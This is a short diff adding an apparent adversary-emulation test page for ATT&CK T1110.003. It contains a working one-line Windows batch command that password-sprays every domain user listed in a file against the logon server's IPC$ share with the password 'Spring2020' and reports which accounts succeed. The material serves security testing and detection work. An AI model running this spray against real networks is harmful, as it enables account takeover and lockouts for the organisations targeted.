@@ -1,0 +1,8 @@
+################T1110.003.md################
+
+##Atomic Test #1 - Password Spray all Domain Users
+
+```parse_net_users.bat```
+```@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:"%userdomain%\%n" "Spring2020" 1>NUL 2>&1 && @echo [*] %n:Spring2020 && @net use /delete %logonserver%\IPC$ > NUL```
+
+```PAUSE```
